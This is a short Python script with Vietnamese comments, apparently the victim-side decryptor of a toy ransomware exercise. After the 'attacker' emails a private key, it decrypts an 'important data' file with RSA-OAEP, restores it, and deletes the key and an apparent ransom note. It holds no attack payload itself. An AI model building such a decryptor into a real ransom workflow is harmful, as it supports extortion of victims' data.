import os
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding


# mo private_key.txt sau khi da nhan duoc mail tu ben tan cong
with open('private_key.txt', 'rb') as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None,
        backend=default_backend()
    )

input_file = 'dataquantrong.ecryptedQT'
output_file = 'dataquantrong.txt'

with open(input_file, 'rb') as f:
    encrypted = f.read()

# giai ma
decrypted = private_key.decrypt(
    encrypted,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# ghi lai vao file data.txt giong nhu ban dau
with open(output_file, 'wb') as f:
    f.write(decrypted)

os.remove(input_file)
os.remove('private_key.txt')
os.remove('README.txt')